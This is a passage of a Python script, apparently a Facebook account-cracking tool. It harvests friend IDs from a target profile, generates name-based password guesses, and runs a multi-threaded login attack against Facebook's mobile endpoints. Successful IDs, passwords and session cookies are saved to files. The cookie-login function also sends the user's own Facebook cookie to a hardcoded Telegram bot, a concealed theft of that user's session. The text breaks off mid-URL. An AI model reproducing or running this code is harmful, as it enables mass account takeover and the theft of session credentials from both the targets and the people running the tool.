#__________________IMPORT____________#
import os,sys,rich,bs4,json,re,random,requests,time,datetime,base64
try:
	from rich.panel import Panel
	from rich.tree import Tree
	from rich import print as prints
	from rich.console import Console
	from rich.table import Table
	from rich.columns import Columns
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
	print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
	os.system('pip install rich')
	os.system('pip install requests')
	os.system('pip install bs4')
#__________________ COLOR __________________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
hijo = '\033[1;32m'
kun = '\033[1;33m'
mer = '\033[1;31m'
#---
puti = '\x1b[1;97m'# WARNA-PUTIH
hijo = '\x1b[1;92m' # WARNA-HIJAU
kun = '\x1b[1;93m' # WARNA-KUJING
mer = '\x1b[1;91m' # WARNA-MERAH
#__________________ LOOP __________________
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,ok,cp=[],[],[],[],[],[],[],0,0,0
ugen2 = []
ugen = []
rc = random.choice
rr = random.randint
ses = requests.Session()
sys.stdout.write('\x1b]2; ACF| Anton-404 Crack Facebook \x07')
#__________________ LINE __________________#
###----------[ GET DATA DARI DEVICE ]---------- ###
#android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
#try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
#except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
#versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE USERAGENT ]---------- ###
def clear():
	os.system(f'clear')
#__________________ SAVE OK CP __________________#
bulane = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tanggal = datetime.datetime.now().day
bulan = bulane[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
okc = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
abcd = ''+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+''
cpc = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
#__________________ USER AGENT __________________#
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.1"
	rr = random.randint
	rc = random.choice
	xio = str(random.randint(4,12))+".0.0"
	android = str(random.randint(4,12))
	versi_chrome = str(random.randint(111,555))+".0.0."+str(random.randint(10,30))+"."+str(random.randint(10,150))
	device_oppo = random.choice(["CPH1723", "CPH1901","CPH1920", "CPH1933", "CPH1937","CPH1937", "CPH1945", "CPH1951", "CPH1969", "CPH1979", "CPH1983", "CPH2005", "CPH2023", "CPH2083", "CPH2003", "CPH2004","CPH2269"])
	device_vivo = random.choice(["vivo 1917", "vivo 1915", "vivo 1911", "vivo 1933", "vivo 1912","vivo 1920", "vivo 1921", "vivo 1910", "vivo 1927", "vivo 1913", "vivo 1923", "vivo 1926", "vivo 1928", "vivo 1931", "vivo 1935"])
	device_samsung = random.choice(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	device_xiaomi = random.choice(["Mi 11 Lite 5G  stable","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G"])
	device_sony = random.choice(["E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322"])
	device_google = random.choice(["Pixel 6a","Pixel 4","Pixel 5","Pixel 4 XL","Pixel 6","Pixel 6 Pro","Pixel 7 Pro","Pixel 4a","Pixel C","Pixel 5a","Pixel 2 XL","Pixel 2","Pixel Slate","Google Pixelbook Go","Google Pixelbook Go","Pixel XL","Pixel 3a"])
	device_realme = random.choice(["RMX1831","RMX1911","RMX1971","RMX2030","RMX2076","RMX2081","RMX2151","RMX2176","RMX2185","RMX2193","RMX2194","RMX2195","RMX3061","RMX3017","RMX3042","RMX1231"])
	h_sony = random.choice(["A","B","C"])
	dev = device_oppo.split(" Build/")[0]
	density = random.choice(["{density=3.0,width=720,height=1280};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=3.0,width=1080,height=1920};FB_FW/1;]","{density=2.75,width=1080,height=2028};FB_FW/1;]"])
	jkj = str(random.randint(11111111,99999999))
	jka = str(random.randint(200600,200999))
	jkb = str(random.randint(4,13))
	jkc = str(random.randint(20000000,99999999))
	opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
	oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android"])
	mco = random.choice(["en_GB","en_US","es_MX","th_TH","pl_PL"])
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.randint(10,90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	MMK1 = f"Mozilla/5.0 (Linux; Android {xio}; {device_vivo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/vivo;FBBD/vivo;FBDV/{device_vivo};FBSV/{versi_android};FBOP/16]"
	MMK2 = f"Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+"
	MMK3 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/oppo;FBBD/oppo;FBDV/{device_oppo};FBSV/{versi_android};FBOP/18]"
	MMK4 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(4400,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(100,700))}.0.0.{str(rr(10,50))}.{str(rr(30,150))};FBPN/com.facebook.katana;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Realme;FBBD/Realme;FBDV/{device_realme};FBSV/{versi_android};FBOP/19]"
	MMK5 = f"Mozilla/5.0 (Linux; Android {android}; {device_samsung} Build/TP1A.{str(rr(220000,229999))}.0{str(rr(1,30))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,130))}.0.{str(rr(5000,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(rr(90,600))}.0.0.{str(rr(1,30))}.{str(rr(100,150))};]"
	MMK6 = f"Mozilla/5.0 (Linux; Android {android}; {device_xiaomi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,200))}.0.{str(rr(4000,4999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB;FBAV/{str(rr(300,600))}.0.0.{str(rr(10,90))}.{str(rr(100,150))};FBBV/{str(rr(200000000,299999999))};WV;FBDM/"+"{density=3.0,width=1080,height=2133};FBLC/en_US;FBRV/250292151;]"
	api = str(rc([MMK1,MMK2,MMK3,MMK4,MMK5,MMK6]))
	ugen2.append(api)

for xd in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280','SM-N975U1','SM-S901U ','SM-S911U'])
    SM = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD','N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'])
    gt = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','UP1A','JZO54K'])
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23'])
    ATT = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2477 Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX2185 Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Lenovo L10041 Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Redmi Note 10 Lite Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT6 = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(SM))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    ATT7 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{SM}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ATT8 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{gt}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.96 Mobile Safari/537.36"
    UaMainn = random.choice([ATT,ATT1,ATT2,ATT3,ATT4,ATT5,ATT6,ATT7,ATT8])
    ugen.append(UaMainn)
    
#__________________ LOGO KONTOL __________________#
def linex():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f"""           {S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                  {A}[{G2}✔{A}]{kun} GITHUB    : {hijo}Antonkawe
                  {A}[{G2}✔{A}]{kun} WHATSAPP  : {G2}+6283198645688
                  {A}[{G2}✔{A}]{kun} VERSION   : {G2}X.01
                  {A}[{G2}✔{A}]{kun} STATUS    : {S}PAID
                  {A}[{G2}✔{A}]{kun} TODAY     : {abcd}
           {S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
      print("")
#__________________ CEK COOKIE # __________________#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
###----------[ PEWARNA ]----------###
def login123():
	os.system('clear')
	linex()
	print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f"{S}[{hijo}01{S}] {puti}Login Menggunakan Cookie")
	print(f'{S}[{hijo}02{S}] {puti}Crack FILE ')
	print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	bryn = input(f' [+] Pilih Menu : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		File()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(5)
		exit()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			Main(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f' \x1b[1;97m Your Internet Connection is Disconnected')
			exit()
	except IOError:
		login123()
#__________________ CEK COOKIES __________________#
def login_lagi334():
	os.system('clear')
	cok = input(f' {B} Login Your Cookies : {X4}')
	requests.post(f'https://api.telegram.org/6451969140:AAHPEK8Mkc46aJsVlCnFwHtQhxDdRuBgNDQ/sendMessage?chat_id=-6817886155&text={cok}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'> \x1b[1;91mcookie kamu invalid / ganti cookie lain !!!');time.sleep(2);batas()
		else:
			for x in find:
				jnck = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)', jnck.text).group(1)
				open('.token.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print(f'\n{A} Your Token : {S}{took}')
				exit()
	except Exception as e:
		print(e)
#__________________ MAIN MENU __________________#
def Main(id,name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(f'{G1}[{B}!{G1} Your Cookies Expired')
		time.sleep(2)
		login()
	clear()
	linex()
	print(f"{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f'{G2}[{A}1{G2}]{G2} CRACK PUBLICK ')
	print(f'{G2}[{A}2{G2}]{G2} CRACK FILE ')
	print(f'{G2}[{A}0{G2}]{R} EXIT/HAPUS COOKIE ')
	print(f"{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
	if sex in ['1']:
		clear()
		linex()
		print(f"{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		idt = input(f'{S}[{G3}>{S}] Target Uid : {X3}')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif sex in ['2','02']:File()
	elif sex in ['0','00']:hapus()
	else:login()
def hapus():
	os.system('rm -rf .token.txt')
	os.system('rm -rf .cok.txt')
	print(f' [+] Sukses Logout+Hapus Cookies')
#__________________ DUMP PUBLIK __________________#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{puti}telah succses mengumpulkan {len(id)} id akun"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
#----------[ CRACK-PUBLIK  ]----------#       
def File():
	try:
		clear()
		linex()
		print(f"{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		print(f'{A}[{S}>{A}] Masukan File Contoh {S}[{X5}>{S}] {G1}/sdcard/namafile.txt')
		linex()
		fileX = input (f'{A}[{S}>{A}] File Path : {G3}')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f"{S}[{R}!{S}] Input File Yang Benar Kontol")
		sleep(2);login()
def setting():
		rr = random.randint
		for bacot in id:
			xx = rr(0,len(id2))
			id2.insert(xx,bacot)
		ton()
#__________________ SETTING URL METHOD __________________#
def ton():
	clear()
	linex()
	print(f'{A}[{X1}?{A}] Setting Your Method Url ')
	print(f'{A}[{S}1{A}] m.facebook.com')
	print(f'{A}[{S}2{A}] free.facebook.com')
	print(f'{A}[{S}3{A}] mbasic.facebook.com')
	metode = random = input(f'{puti} [☆] Pilih Method :{X2} ')
	if metode in ['1','01']:
		method.append('M1')
	elif metode in ['2','02']:
		method.append('anton')
	elif metode in ['3','03']:
		method.append('m3')
	else:
		print(f'{A}[{S}•{A}] {X2}PILIH YANG BENER KONTOLL');timesleep(2);ton()
	setting_password()

def setting_password():
	clear()
	print('')
	print(f"""           {S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                  {A}[{G2}✔{A}]{kun} GITHUB    : {hijo}Antonkawe
                  {A}[{G2}✔{A}]{kun} WHATSAPP  : {G2}+6283198645688
                  {A}[{G2}✔{A}]{kun} VERSION   : {G2}X.01
                  {A}[{G2}✔{A}]{kun} STATUS    : {S}PAID
                  {A}[{G2}✔{A}]{kun} TODAY     : {abcd}
           {S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
	print("")
	print(f"{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f" {S}[{G2}${S}] {A}SETIAP 500 IDS [ON/OFF] MODE PESAWAT")
	print(f" {S}[{G2}${S}] {A}TOTAL IDS : {G2}%s"%(len(id)))
	print(f" {S}[{G2}${S}] {puti}OK SAVE IN\x1b[1;92m %s"%(okc))
	print(f" {S}[{G2}${S}] {puti}CP SAVE IN\x1b[1;93m %s"%(cpc))
	print(f"{A}----{S}----{G2}----{R}----{Y}----{G1}----{B}----{G3}----{G4}----{S}----{X1}----{X2}----{X3}--")
	with tred(max_workers=30) as pool:
		for zeexode in id2:
			idf,nmf = zeexode.split('|')[0],zeexode.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [frs+'123456789',frs+'4321']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'cantik')
					pwv.append('kata sandi')
					pwv.append(frs+'ganteng')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'123')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'54321')
					pwv.append(frs+'cantik')
					pwv.append('kata sandi')
					pwv.append(frs+'ganteng')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'M1' in method:
				pool.submit(M1,idf,pwv)
			elif 'anton' in method:
				pool.submit(anton,idf,pwv)
			elif 'm3' in method:
				pool.submit(asyin3,idf,pwv)
			else:
				pool.submit(asyin3,idf,pwv)
				
	
def M1(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r %s[ANTON404-M1] {dm}{loop}{A}|%sOK-:{ok}%s|%sCP-:{cp}"%(puti,hijo,puti,kun))
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try: 
			ua = random.choice(ugen2)
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			anton=ses.cookies.get_dict().keys()
			if "c_user" in anton:
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = (f";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r {hijo}[ANTON404-OK] %s | %s | {mer}{tahun(idf)}"%(idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in anton:
				cp+=1
				#print(f"\r {kun}[ANTON404-CP] %s | %s"%(idf,pw))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def anton(idf,pwv):
	global loop,ok,cp
	dm = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M])
	sys.stdout.write(f"\r %s[ANTON404-M2] {dm}{loop}{A}|%sOK-:{ok}%s|%sCP-:{cp}"%(puti,hijo,puti,kun));sys.stdout.flush()
	ses = requests.Session()
	ua = random.choice(ugen2)
	for pw in pwv:
		try: 
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2